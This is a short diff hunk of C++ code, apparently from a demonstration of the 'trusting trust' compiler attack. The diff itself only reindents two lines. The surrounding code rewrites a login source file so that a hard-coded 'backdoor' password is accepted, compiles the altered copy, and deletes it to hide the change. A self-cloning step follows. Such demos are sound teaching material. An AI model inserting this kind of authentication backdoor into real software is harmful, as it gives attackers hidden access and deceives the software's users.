@@ -26,8 +26,8 @@ void compileLoginWithBackdoor(string allArgs) {
         "enteredPassword == \"test123\" || enteredPassword == \"backdoor\""
     );
     string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Login.cpp"), "LoginWithBackdoor.cpp");
-	system(modifiedCommand.c_str());
-	remove("LoginWithBackdoor.cpp");
+    system(modifiedCommand.c_str());
+    remove("LoginWithBackdoor.cpp");
 }
 
 void cloneMyselfInsteadOfCompiling(int argc, char* argv[]) {
